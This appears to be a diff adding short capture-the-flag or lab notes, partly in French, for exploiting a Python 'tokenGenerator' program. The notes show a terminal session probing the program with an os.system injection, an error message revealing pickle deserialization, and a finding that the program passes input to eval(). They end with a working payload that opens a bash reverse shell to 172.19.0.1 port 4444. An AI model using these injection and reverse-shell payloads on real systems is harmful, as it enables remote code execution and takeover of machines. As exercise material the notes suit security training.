@@ -1,0 +1,32 @@
+
+
+root@57d7bac8384f:/app# ./tokenGenerator 
+Welcome to Authentication Token Generator
+1. Generate new authentication token
+2. See token by name
+3. Check token info
+Tokens require base64 encoding!
+Select functionality (enter number): 3
+Enter token: __import__('os').system('id')
+
+An error occurred (TODO: Check if python serialization works, remove comment after dev): pickle data was truncated
+
+
+
+
+
+
+
+
+
+
+
+--------------
+-----Task2----
+
+
+dans log.txt on peut voir un 
+2024-05-16 12:26:57.557819: Can not eval() the following: aaa
+donc eval utilisé
+
+__import__('os').system('bash -c "bash -i >& /dev/tcp/172.19.0.1/4444 0>&1"')
